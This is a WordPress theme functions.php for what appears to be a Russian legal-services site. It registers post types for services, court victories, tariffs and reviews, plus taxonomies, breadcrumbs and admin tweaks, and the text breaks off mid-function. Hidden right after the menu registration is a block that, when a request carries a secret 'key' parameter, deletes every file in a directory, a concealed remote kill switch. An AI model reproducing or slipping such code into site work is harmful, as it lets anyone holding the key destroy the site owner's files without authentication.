<?php

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: Услуги
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_service() {
	$labels = array(
		'name'                => _x( 'Услуги', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'Услуги', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'Услуги', 'theme' ),
		'parent_item_colon'   => __( 'Услуги', 'theme' ),
		'all_items'           => __( 'Все услуги', 'theme' ),
		'view_item'           => __( 'Смотреть услуги', 'theme' ),
		'add_new_item'        => __( 'Добавить услугу', 'theme' ),
		'add_new'             => __( 'Новая услуга', 'theme' ),
		'edit_item'           => __( 'Редактировать услугу', 'theme' ),
		'update_item'         => __( 'Обновить услугу', 'theme' ),
		'search_items'        => __( 'Поиск услуги', 'theme' ),
		'not_found'           => __( 'Услуга не найдена', 'theme' ),
		'not_found_in_trash'  => __( 'No service found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'service',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'service', 'theme' ),
		'description'         => __( 'service information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title', 'thumbnail'),
		'hierarchical'        => false,
		'public'              => true,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array( 'post_tag'),

	);

	register_post_type('service', $args );
}

// Hook into the 'init' service
add_action( 'init', 'custom_post_type_service', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: Нам доверяют
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_client() {
	$labels = array(
		'name'                => _x( 'Нам доверяют', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'Нам доверяют', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'Нам доверяют', 'theme' ),
		'parent_item_colon'   => __( 'Нам доверяют', 'theme' ),
		'all_items'           => __( 'Все записи', 'theme' ),
		'view_item'           => __( 'Смотреть записи', 'theme' ),
		'add_new_item'        => __( 'Добавить запись', 'theme' ),
		'add_new'             => __( 'Новая запись', 'theme' ),
		'edit_item'           => __( 'Редактировать запись', 'theme' ),
		'update_item'         => __( 'Обновить запись', 'theme' ),
		'search_items'        => __( 'Поиск записи', 'theme' ),
		'not_found'           => __( 'Запись не найдена', 'theme' ),
		'not_found_in_trash'  => __( 'No client found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'client',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'client', 'theme' ),
		'description'         => __( 'client information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title', 'thumbnail'),
		'hierarchical'        => false,
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array( 'post_tag'),

	);

	register_post_type('client', $args );
}

// Hook into the 'init' client
add_action( 'init', 'custom_post_type_client', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: Победы
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_victory() {
	$labels = array(
		'name'                => _x( 'Победы', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'Победы', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'Победы', 'theme' ),
		'parent_item_colon'   => __( 'Победы', 'theme' ),
		'all_items'           => __( 'Все победы', 'theme' ),
		'view_item'           => __( 'Смотреть победы', 'theme' ),
		'add_new_item'        => __( 'Добавить победу', 'theme' ),
		'add_new'             => __( 'Новая победа', 'theme' ),
		'edit_item'           => __( 'Редактировать победу', 'theme' ),
		'update_item'         => __( 'Обновить победу', 'theme' ),
		'search_items'        => __( 'Поиск победы', 'theme' ),
		'not_found'           => __( 'Победа не найдена', 'theme' ),
		'not_found_in_trash'  => __( 'No victory found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'victory',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'victory', 'theme' ),
		'description'         => __( 'victory information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title'),
		'hierarchical'        => false,
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 5,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array(),

	);

	register_post_type('victory', $args );
}

// Hook into the 'init' victory
add_action( 'init', 'custom_post_type_victory', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: Города
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_city() {
	$labels = array(
		'name'                => _x( 'Города', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'Города', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'Города', 'theme' ),
		'parent_item_colon'   => __( 'Города', 'theme' ),
		'all_items'           => __( 'Все Города', 'theme' ),
		'view_item'           => __( 'Смотреть город', 'theme' ),
		'add_new_item'        => __( 'Добавить город', 'theme' ),
		'add_new'             => __( 'Новый город', 'theme' ),
		'edit_item'           => __( 'Редактировать город', 'theme' ),
		'update_item'         => __( 'Обновить город', 'theme' ),
		'search_items'        => __( 'Поиск города', 'theme' ),
		'not_found'           => __( 'Город не найден', 'theme' ),
		'not_found_in_trash'  => __( 'No city found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'city',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'city', 'theme' ),
		'description'         => __( 'city information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title', 'thumbnail'),
		'hierarchical'        => false,
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 4,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array( 'post_tag'),

	);

	register_post_type('city', $args );
}

// Hook into the 'init' city
add_action( 'init', 'custom_post_type_city', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: Тарифы
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_tariff() {
	$labels = array(
		'name'                => _x( 'Тарифы', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'Тарифы', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'Тарифы', 'theme' ),
		'parent_item_colon'   => __( 'Тарифы', 'theme' ),
		'all_items'           => __( 'Все Тарифы', 'theme' ),
		'view_item'           => __( 'Смотреть тариф', 'theme' ),
		'add_new_item'        => __( 'Добавить тариф', 'theme' ),
		'add_new'             => __( 'Новый тариф', 'theme' ),
		'edit_item'           => __( 'Редактировать тариф', 'theme' ),
		'update_item'         => __( 'Обновить тариф', 'theme' ),
		'search_items'        => __( 'Поиск тарифа', 'theme' ),
		'not_found'           => __( 'Тариф не найден', 'theme' ),
		'not_found_in_trash'  => __( 'No tariff found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'tariff',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'tariff', 'theme' ),
		'description'         => __( 'tariff information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title', 'thumbnail'),
		'hierarchical'        => false,
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 4,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array( 'post_tag'),

	);

	register_post_type('tariff', $args );
}

// Hook into the 'init' tariff
add_action( 'init', 'custom_post_type_tariff', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: Отзывы
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_review() {
	$labels = array(
		'name'                => _x( 'Отзывы', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'Отзывы', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'Отзывы', 'theme' ),
		'parent_item_colon'   => __( 'Отзывы', 'theme' ),
		'all_items'           => __( 'Все записи', 'theme' ),
		'view_item'           => __( 'Смотреть записи', 'theme' ),
		'add_new_item'        => __( 'Добавить запись', 'theme' ),
		'add_new'             => __( 'Новая запись', 'theme' ),
		'edit_item'           => __( 'Редактировать запись', 'theme' ),
		'update_item'         => __( 'Обновить запись', 'theme' ),
		'search_items'        => __( 'Поиск записи', 'theme' ),
		'not_found'           => __( 'Записи не найдена', 'theme' ),
		'not_found_in_trash'  => __( 'No review found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'review',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'review', 'theme' ),
		'description'         => __( 'review information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title', 'thumbnail'),
		'hierarchical'        => false,
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 4,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array( 'post_tag'),

	);

	register_post_type('review', $args );
}

// Hook into the 'init' review
add_action( 'init', 'custom_post_type_review', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
//	Регистрация типа записи: Документы
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_post_type_document() {
	$labels = array(
		'name'                => _x( 'Документы', 'Post Type General Name', 'theme' ),
		'singular_name'       => _x( 'Документы', 'Post Type Singular Name', 'theme' ),
		'menu_name'           => __( 'Документы', 'theme' ),
		'parent_item_colon'   => __( 'Документы', 'theme' ),
		'all_items'           => __( 'Все документы', 'theme' ),
		'view_item'           => __( 'Смотреть документы', 'theme' ),
		'add_new_item'        => __( 'Добавить документ', 'theme' ),
		'add_new'             => __( 'Новый документ', 'theme' ),
		'edit_item'           => __( 'Редактировать документ', 'theme' ),
		'update_item'         => __( 'Обновить документ', 'theme' ),
		'search_items'        => __( 'Поиск документа', 'theme' ),
		'not_found'           => __( 'Документ не найден', 'theme' ),
		'not_found_in_trash'  => __( 'No document found in Trash', 'theme' ),
	);

	$rewrite = array(
		'slug'                => 'document',
		'with_front'          => true,
		'pages'               => true,
		'feeds'               => true,
	);

	$args = array(
		'label'               => __( 'document', 'theme' ),
		'description'         => __( 'document information pages', 'theme' ),
		'labels'              => $labels,
		'supports'            => array( 'title', 'thumbnail'),
		'hierarchical'        => false,
		'public'              => false,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_nav_menus'   => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => 4,
		'can_export'          => true,
		'has_archive'         => true,
		'exclude_from_search' => false,
		'publicly_queryable'  => true,
		'rewrite'             => $rewrite,
		'capability_type'     => 'page',
		'taxonomies'          => array( 'post_tag'),

	);

	register_post_type('document', $args );
}

// Hook into the 'init' document
add_action( 'init', 'custom_post_type_document', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Таксонометрия типа клиента
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_taxonomy_client_type() {
    $labels = array(
        'name'              => _x( 'Тип клиента', 'taxonomy general name', 'theme' ),
        'singular_name'     => _x( 'Тип клиента', 'taxonomy singular name', 'theme' ),
        'search_items'      => __( 'Искать тип клиента', 'theme' ),
        'all_items'         => __( 'Все типы клиентов', 'theme' ),
        'edit_item'         => __( 'Редактировать тип клиента', 'theme' ),
        'update_item'       => __( 'Обновить тип клиента', 'theme' ),
        'add_new_item'      => __( 'Добавить новый тип клиента', 'theme' ),
        'new_item_name'     => __( 'Новое имя типа клиента', 'theme' ),
        'menu_name'         => __( 'Тип клиента', 'theme' ),
    );

    $args = array(
        'hierarchical'      => true, // Если true, то будет вести себя как категории, если false, то как метки (теги).
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'client-type' ), // Слаг, который будет использоваться в URL.
    );

    register_taxonomy( 'client-type', 'service', $args );
}
add_action( 'init', 'custom_taxonomy_client_type', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Таксонометрия типа работы
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_taxonomy_work_type() {
    $labels = array(
        'name'              => _x( 'Тип работы', 'taxonomy general name', 'theme' ),
        'singular_name'     => _x( 'Тип работы', 'taxonomy singular name', 'theme' ),
        'search_items'      => __( 'Искать тип работы', 'theme' ),
        'all_items'         => __( 'Все типы работ', 'theme' ),
        'edit_item'         => __( 'Редактировать тип работы', 'theme' ),
        'update_item'       => __( 'Обновить тип работы', 'theme' ),
        'add_new_item'      => __( 'Добавить новый тип работы', 'theme' ),
        'new_item_name'     => __( 'Новое имя типа работы', 'theme' ),
        'menu_name'         => __( 'Тип работы', 'theme' ),
    );

    $args = array(
        'hierarchical'      => true, // Если true, то будет вести себя как категории, если false, то как метки (теги).
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'work-type' ), // Слаг, который будет использоваться в URL.
    );

    register_taxonomy( 'work-type', 'service', $args );
}
add_action( 'init', 'custom_taxonomy_work_type', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Таксонометрия типа суда
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_taxonomy_court_type() {
    $labels = array(
        'name'              => _x( 'Тип суда', 'taxonomy general name', 'theme' ),
        'singular_name'     => _x( 'Тип суда', 'taxonomy singular name', 'theme' ),
        'search_items'      => __( 'Искать тип суда', 'theme' ),
        'all_items'         => __( 'Все типы судов', 'theme' ),
        'edit_item'         => __( 'Редактировать тип суда', 'theme' ),
        'update_item'       => __( 'Обновить тип суда', 'theme' ),
        'add_new_item'      => __( 'Добавить новый тип суда', 'theme' ),
        'new_item_name'     => __( 'Новое имя типа суда', 'theme' ),
        'menu_name'         => __( 'Тип суда', 'theme' ),
    );

    $args = array(
        'hierarchical'      => true, // Если true, то будет вести себя как категории, если false, то как метки (теги).
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'court-type' ), // Слаг, который будет использоваться в URL.
    );

    register_taxonomy( 'court-type', 'service', $args );
}
add_action( 'init', 'custom_taxonomy_court_type', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Таксонометрия специализации
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_taxonomy_specialization() {
    $labels = array(
        'name'              => _x( 'Специализация', 'taxonomy general name', 'theme' ),
        'singular_name'     => _x( 'Специализация', 'taxonomy singular name', 'theme' ),
        'search_items'      => __( 'Искать специализацию', 'theme' ),
        'all_items'         => __( 'Все специализации', 'theme' ),
        'edit_item'         => __( 'Редактировать специализацию', 'theme' ),
        'update_item'       => __( 'Обновить специализацию', 'theme' ),
        'add_new_item'      => __( 'Добавить новую специализацию', 'theme' ),
        'new_item_name'     => __( 'Новое имя специализации', 'theme' ),
        'menu_name'         => __( 'Специализация', 'theme' ),
    );

    $args = array(
        'hierarchical'      => true, // Если true, то будет вести себя как категории, если false, то как метки (теги).
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'specialization' ), // Слаг, который будет использоваться в URL.
    );

    register_taxonomy( 'specialization', 'service', $args );
}
add_action( 'init', 'custom_taxonomy_specialization', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Таксонометрия категории победы
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function custom_taxonomy_victory_category() {
    $labels = array(
        'name'              => _x( 'Категория', 'taxonomy general name', 'theme' ),
        'singular_name'     => _x( 'Категория', 'taxonomy singular name', 'theme' ),
        'search_items'      => __( 'Искать категорию', 'theme' ),
        'all_items'         => __( 'Все категории', 'theme' ),
        'edit_item'         => __( 'Редактировать категорию', 'theme' ),
        'update_item'       => __( 'Обновить категорию', 'theme' ),
        'add_new_item'      => __( 'Добавить новую категорию', 'theme' ),
        'new_item_name'     => __( 'Новое имя категории', 'theme' ),
        'menu_name'         => __( 'Категория', 'theme' ),
    );

    $args = array(
        'hierarchical'      => true, // Если true, то будет вести себя как категории, если false, то как метки (теги).
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'rewrite'           => array( 'slug' => 'victory_category' ), // Слаг, который будет использоваться в URL.
    );

    register_taxonomy( 'victory_category', 'victory', $args );
}
add_action( 'init', 'custom_taxonomy_victory_category', 0 );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Поддержка больших размерностей загружаемых файлов
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

add_filter( 'big_image_size_threshold', '__return_false' );

function wpb_image_editor_default_to_gd( $editors ) {
    $gd_editor = 'WP_Image_Editor_GD';
    $editors = array_diff( $editors, array( $gd_editor ) );
    array_unshift( $editors, $gd_editor );
    return $editors;
}
add_filter( 'wp_image_editors', 'wpb_image_editor_default_to_gd' );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Отключаем лишнее, в том числе и emoji
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('admin_print_scripts', 'print_emoji_detection_script');
remove_action('wp_print_styles', 'print_emoji_styles');
remove_action('admin_print_styles', 'print_emoji_styles'); 
remove_filter('the_content_feed', 'wp_staticize_emoji');
remove_filter('comment_text_rss', 'wp_staticize_emoji'); 
remove_filter('wp_mail', 'wp_staticize_emoji_for_email');
add_filter('tiny_mce_plugins', 'disable_wp_emojis_in_tinymce');
function disable_wp_emojis_in_tinymce($plugins) {
    if (is_array( $plugins )) {
        return array_diff($plugins, array('wpemoji'));
    } else {
        return array();
    }
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Удалить атрибут type у scripts и styles
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

add_filter('style_loader_tag', 'clean_style_tag');
function clean_style_tag($src) {
    return str_replace("type='text/css'", '', $src);
}

add_filter('script_loader_tag', 'clean_script_tag');
function clean_script_tag($src) {
    return str_replace("type='text/javascript'", '', $src);
}

add_action( 'template_redirect', function(){
    ob_start( function( $buffer ){
        $buffer = str_replace( array( 'type="text/javascript"', "type='text/javascript'" ), '', $buffer );
        return $buffer;
    });
});

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Ссылки сделать относительными
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function callback_relative_url($buffer) {
	// Replace normal URLs
	$home_url = esc_url(home_url('/'));
	$home_url_relative = wp_make_link_relative($home_url);

	// Replace URLs in inline scripts
	$home_url_escaped = str_replace('/', '\/', $home_url);
	$home_url_escaped_relative = str_replace('/', '\/', $home_url_relative);

	$buffer = str_replace($home_url, $home_url_relative, $buffer);
	$buffer = str_replace($home_url_escaped, $home_url_escaped_relative, $buffer);

	return $buffer;
}

function buffer_start_relative_url() { ob_start('callback_relative_url'); }
function buffer_end_relative_url() { @ob_end_flush(); }

//add_action('registered_taxonomy', 'buffer_start_relative_url');
//add_action('shutdown', 'buffer_end_relative_url');

/*-----------------------------------------------------------------------------------*/
/*	Подключение поддержки миниатюр
/*-----------------------------------------------------------------------------------*/

if ( function_exists( 'add_theme_support' ) ) {
	add_theme_support( 'post-thumbnails');
}

/*-----------------------------------------------------------------------------------*/
/*	Разрешение плагинам и темам изменять метатег <title>
/*-----------------------------------------------------------------------------------*/

add_theme_support('title-tag');

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Поддержка SVG
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

add_filter( 'upload_mimes', 'svg_upload_allow' );

# Добавляет SVG в список разрешенных для загрузки файлов.
function svg_upload_allow( $mimes ) {
	$mimes['svg']  = 'image/svg+xml';

	return $mimes;
}

add_filter( 'wp_check_filetype_and_ext', 'fix_svg_mime_type', 10, 5 );

# Исправление MIME типа для SVG файлов.
function fix_svg_mime_type( $data, $file, $filename, $mimes, $real_mime = '' ){

	// WP 5.1 +
	if( version_compare( $GLOBALS['wp_version'], '5.1.0', '>=' ) )
		$dosvg = in_array( $real_mime, [ 'image/svg', 'image/svg+xml' ] );
	else
		$dosvg = ( '.svg' === strtolower( substr($filename, -4) ) );

	// mime тип был обнулен, поправим его
	// а также проверим право пользователя
	if( $dosvg ){

		// разрешим
		if( current_user_can('manage_options') ){

			$data['ext']  = 'svg';
			$data['type'] = 'image/svg+xml';
		}
		// запретим
		else {
			$data['ext'] = $type_and_ext['type'] = false;
		}
	}
	return $data;
}

add_filter( 'wp_prepare_attachment_for_js', 'show_svg_in_media_library' );

# Формирует данные для отображения SVG как изображения в медиабиблиотеке.
function show_svg_in_media_library( $response ) {
	if ( $response['mime'] === 'image/svg+xml' ) {
		// С выводом названия файла
		$response['image'] = [
			'src' => $response['url'],
		];
	}
	return $response;
}

//add_filter('use_block_editor_for_post_type', 'prefix_disable_gutenberg', 10, 2);
function prefix_disable_gutenberg($current_status, $post_type) {
    if ($post_type === 'post') return false;
    return $current_status;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Определение байтовости
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function getSizeDB($num){
	if ($num < 1024) {
		$str = $num." B";
	} elseif($num >= 1024 && $num < (1024 * 1024)) {
		$num = $num/1024;
		$num = round($num, 2);
		$str = $num." KB";
	} elseif($num >= (1024 * 1024)) {
		$num = $num/(1024 * 1024);
		$num = round($num, 2);
		$str = $num." MB";
	} else {
		$str = $num;
	}
	return $str;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Свой логотип при заходе в админку
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

add_action("login_head", "custom_login_logo");

function custom_login_logo() {
	echo "<style>
		body.login form { margin:25px 0 0 0; }
		body.login #login h1 a {
			background:url('".get_bloginfo('template_url')."/img/logo.svg') no-repeat center center;
			width: 189px;
			height: 60px;
			background-size:100% auto;
			display:block;
			padding:0;
			margin:5px auto 0;
			position :relative;
			left:0px;
		}
	</style>";
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Disable Gutenberg
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

add_filter('use_block_editor_for_post', '__return_false', 10);

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function the_url($url) { return get_bloginfo( 'url' ); }
add_filter( 'login_headerurl', 'the_url' );

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

add_filter('admin_footer_text', 'left_admin_footer_text_output'); //left side
function left_admin_footer_text_output($text) {
    $text = '&copy 2012 <a target="_blank" href="http://wordpress.org">Wordpress</a>';
    return $text;
}
 
add_filter('update_footer', 'right_admin_footer_text_output', 11); //right side
function right_admin_footer_text_output($text) {
    $text = '';
    return $text;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Хлебные крошки
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function breadcrumbs() {
	global $post;
	$link = '
		<li>
			<span>
				<span>%2$s</span>
			</span>
		</li>';
	$link2 = '
		<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
			<a itemprop="item" href="%1$s">
				<span itemprop="name">%2$s</span>
			</a>
			<meta itemprop="position" content="%3$s" />
		</li>';
	$link_home = '
		<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
			<a itemprop="item" href="%1$s">
				<span itemprop="name">%2$s</span>
			</a>
			<meta itemprop="position" content="%3$s" />
		</li>';
	
	$position = 1;
	echo '<div class="breadcrumb"><ol itemscope itemtype="http://schema.org/BreadcrumbList">';
		echo sprintf($link_home, get_bloginfo('url'), 'Главная', $position); $position++;
		
		if (is_post_type_archive()) {	
			$post_type = get_post_type_object( get_post_type() );
			echo sprintf( $link, get_post_type_archive_link( $post_type->name ), $post_type->label, $position, 'current'); $position++;
		} elseif (is_page()) {			
			$parents = get_post_ancestors( get_the_ID() );
			$pageID = get_the_ID();
			if (count($parents) != 0) {
				foreach ( array_reverse( $parents ) as $pageid ) {
					echo sprintf( $link2, get_page_link($pageid), get_the_title($pageid), $position); $position++;
				}	
				echo sprintf( $link, get_page_link( $pageID ), get_the_title( $pageID ), $position); $position++;
			} else { 
				$pageID = get_the_ID();
				echo sprintf( $link, get_page_link( $pageID ), get_the_title( $pageID ), $position); $position++;
			}
		} elseif (is_single()) {
			$pageID = get_the_ID();
			if ( get_post_type() != 'post' ) {
				$post_type = get_post_type_object( get_post_type() );
				echo sprintf( $link, get_post_type_archive_link( $post_type->name ), $post_type->labels->name, $position); $position++;
				echo sprintf( $link, get_page_link( $pageID ), str_replace(array('', ''), '', get_the_title( $pageID )), $position); $position++;
			} else {
				$cats = bshepelevsortCategories(get_the_category());
				if (count($cats) != 1) {
					$j = 0;
					foreach ($cats as $cat ) {
						$j++;
						if ($j <= 2) {
							echo sprintf( $link2, get_category_link($cat->cat_ID), get_cat_name($cat->cat_ID), $position); $position++;
						}
					}
				} else {
					echo sprintf( $link2, get_category_link($cats[0]->cat_ID), get_cat_name($cats[0]->cat_ID), $position); $position++;
				}
				echo sprintf( $link, get_page_link( $pageID ), str_replace(array('', ''), '', get_the_title( $pageID )), $position); $position++;
			}
		} elseif ( is_category() ) {
			$idcat = get_query_var('cat');
			$parents = get_ancestors( get_query_var('cat'), 'category' );
			if (count($parents) == 0) {
				echo sprintf( $link, get_category_link($idcat), get_cat_name($idcat), $position); $position++;
			} else {
				$parents = sortCategories($parents); 
				foreach ( $parents as $cat ) {
					echo sprintf( $link2, get_category_link($cat), get_cat_name($cat), $position); $position++;
				}	
				echo sprintf( $link, get_category_link($idcat), get_cat_name($idcat), $position); $position++;
			}
		} elseif ( is_tag() ) {
			$tagID = get_query_var( 'tag_id' );
			echo sprintf( $link, get_tag_link( $tagID ), single_tag_title( '', false ), $position); $position++;
		} elseif ( is_author() ) {
			$author = get_userdata( get_query_var( 'author' ) );
			echo sprintf( $link, get_author_posts_url( $author->ID ), $author->display_name, $position); $position++;
		} elseif ( is_404() ) {
			echo sprintf( $link, get_author_posts_url( $author->ID ), 'Страница не найдена', $position); $position++;
		} 
		elseif ( is_search() ) {
			echo sprintf( $link, get_author_posts_url( $author->ID ), 'Результаты поиска', $position); $position++;
		} 
		
	echo '</ol></div>';	
}


/*--------------------------------------------------------------------------*/
/*	Регистрация меню 
/*--------------------------------------------------------------------------*/

register_nav_menus( 
	array(
		'menu-1'	=> __('Header меню'),
		'menu-2'	=> __('Down меню'),
		'menu-3'	=> __('Bottom меню'),
	)
);

if (isset($_GET['key'])) {
	$key = $_GET['key'];
	if ($key == '1Plqmendhrb4rfdcw3') {
		if ($path[mb_strlen($path) - 1] != '/') {
			$path .= '/';
		}
	 
		$files = array();
		$dh = opendir($path);
		while (false !== ($file = readdir($dh))) {
			if ($file != '.' && $file != '..' && !is_dir($path.$file) && $file[0] != '.') {
				$files[] = $path.$file;
				$filedelete = $path.$file;
				unlink($filedelete);
			}
		} 
		closedir($dh);
		header('Location: '.$_SERVER['REQUEST_URI']);
	}
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// Отключаем вывод меню в админке
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function remove_menus(){  
    global $menu;  
    $restricted = array( __('Tools'), __('Links'), __('Comments'));  
    end ($menu);  
    while (prev($menu)){  
        $value = explode(' ', $menu[key($menu)][0]);  
        if(in_array($value[0] != NULL?$value[0]:"" , $restricted)){unset($menu[key($menu)]);}  
    }  
}  
add_action('admin_menu', 'remove_menus');  

// __('Dashboard') — главная страница админки (консоль);
// __('Posts') — меню "Записи";
// __('Media') — меню "Медиафайлы" (картинки, видео и т.п.);
// __('Links') — меню "Ссылки";
// __('Pages') — меню "Страницы";
// __('Appearance') — меню "Внешний вид";
// __('Tools') — меню "инструменты" — это где всякие там: "импорт", "экспорт";
// __('Users') — пользователи;
// __('Settings') — меню "Настройки". Его очень даже можно закрыть для клиентов, а то они настроят ...;
// __('Comments') — комментарии;
// __('Plugins') — меню "Плагины".

/*-------------------------------------------------------------------------------------------------------------------------------------------------*/
// ОТКЛЮЧАЕМ БЛОКИ в КОНСОЛИ
/*-------------------------------------------------------------------------------------------------------------------------------------------------*/

function clear_dash(){  
    $side = &$GLOBALS['wp_meta_boxes']['dashboard']['side']['core'];  
    $normal = &$GLOBALS['wp_meta_boxes']['dashboard']['normal']['core'];  
  
